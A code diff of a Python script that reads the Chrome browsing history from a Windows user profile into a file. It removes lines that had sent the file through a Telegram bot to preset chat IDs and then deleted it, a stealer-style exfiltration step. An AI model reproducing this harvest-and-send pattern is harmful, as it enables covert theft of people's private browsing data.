@@ -48,7 +48,7 @@ def setup_logging():
     logging.info("🔧 Логирование запущено")
 
 
-async def get_browser_history_log_to_file(browser, limit=100):
+def get_browser_history_log_to_file(browser, limit=100):
     try:
         if browser == 'chrome':
             history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
@@ -87,11 +87,7 @@ async def get_browser_history_log_to_file(browser, limit=100):
                 visit_time = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                 f.write(f"📅 {visit_time.strftime('%Y-%m-%d %H:%M:%S')}\n🔗 {title or '(без названия)'}\n🌐 {url}\n\n")
 
-        bot = Bot(token=TOKEN)
-        for chat_id in KNOWN_IDS:
-            await bot.send_document(chat_id, FSInputFile(output_path))
-        os.remove(output_path)
-        await bot.session.close()
+        return output_path
 
     except Exception as e:
         return f"⚠️ Ошибка: {e}"
